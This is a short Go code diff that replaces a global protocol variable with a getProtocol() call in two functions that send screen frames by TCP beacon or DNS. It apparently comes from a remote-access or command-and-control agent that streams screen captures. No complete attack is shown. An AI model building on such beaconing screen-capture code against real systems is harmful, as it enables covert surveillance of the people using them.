@@ -27,7 +27,7 @@ func sendScreenStreamError(msg string) {
 	if !ok || kind != agentFrameEncrypted {
 		return
 	}
-	switch Protocol {
+	switch getProtocol() {
 	case "tcp":
 		sendTCPBeacon(sendBody)
 	case "dns":
@@ -67,7 +67,7 @@ func sendScreenFrame(data []byte) {
 	if !ok || kind != agentFrameEncrypted {
 		return
 	}
-	switch Protocol {
+	switch getProtocol() {
 	case "tcp":
 		sendTCPBeacon(sendBody)
 	case "dns":
